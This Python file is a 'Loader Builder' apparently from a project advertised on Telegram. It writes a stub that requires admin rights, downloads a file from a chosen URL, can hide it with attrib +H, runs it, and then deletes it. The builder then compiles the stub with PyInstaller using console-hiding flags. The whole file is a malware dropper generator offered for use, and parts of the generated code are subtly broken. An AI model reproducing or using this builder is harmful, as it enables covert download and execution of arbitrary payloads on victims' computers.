# Builded by Ametero for Ametero Project
# Version : v0.3 (Multitool integration)

import os
import time
import argparse

def print_error(msg):
    print(msg)
    time.sleep(2)
# Пример ss14.ssoc https://minecraft-inside.ru/uploads/files/2021-04/OreExcavation-1.16.54-1.8.157.jar Yes No No Yes
parser=argparse.ArgumentParser(description="sample argument parser")
parser.add_argument("name", type=str)
parser.add_argument("url", type=str)
parser.add_argument("compile", choices=['Yes', 'No'])
parser.add_argument("suicide", choices=["Yes", "No"])
parser.add_argument("hide", choices=["Yes", "No"])
parser.add_argument("run", choices=["Yes", "No"])
args=parser.parse_args()
fp = open('stub.py', 'w')
fp.write('from tkinter import messagebox as mb\n')
fp.write('# Used Loader Builder by Ametero for Ametero Project\n')
fp.write('# https://t.me/ametero_project\n')
fp.write("import os\n")
fp.write("from urllib import request\n")
fp.write("from urllib3 import PoolManager\n")
fp.write("url = '"+ args.url + "'\n")
fp.write("import ctypes\n")
fp.write("def isAdmin():\n")
fp.write("  try:\n")
fp.write("      is_admin = (os.getuid() == 0)\n")
fp.write("  except AttributeError:\n")
fp.write("       is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n")
fp.write("       return is_admin\n")
fp.write("def internet_on():\n")
fp.write("  try:\n")
fp.write("      request.urlopen('https://google.com', timeout=7)\n")
fp.write("      return True\n")
fp.write("  except request.URLError as err: \n")
fp.write("      return False\n")
fp.write("if isAdmin():\n")
fp.write("    if internet_on() == True:\n")
fp.write("          filename = '" + args.name + "'\n")
fp.write("          http = PoolManager()\n")
fp.write("          response = http.request('GET', url)\n")
fp.write("          image_data = response.data\n")
fp.write("          with open(filename, 'wb') as file:\n")
fp.write("               file.write(image_data)\n")
if args.hide == "Yes":
    fp.write('               os.system("attrib +H "+ filename)\n')
elif args.hide == "No":
    pass
else:
    print_error("Incorrect Param(s). Contact with developer of multitool")
if args.run == "Yes":
    fp.write('          os.system(filename)\n')
elif args.run == "No":
    pass
else:
    print_error("Incorrect Param(s). Contact with developer of multitool")
if args.suicide == "Yes":
    fp.write('          os.remove(filename)\n')
elif args.suicide == "No":
    pass
else:
    print_error("Incorrect Param(s). Contact with developer of multitool")
fp.write("    else:\n")
fp.write("     mb.showerror('Error!', 'Please connect to internet')\n")
fp.write("else:\n")
fp.write(" mb.showerror('Error!', 'Please start with admin permission')\n")
fp.close
if args.compile == "Yes":
    fp.close()
    os.system("pyinstaller stub.py --hide-console hide-early --disable-windowed-traceback --onefile")
    print("Done!!")
elif args.compile == "No":
    fp.close()

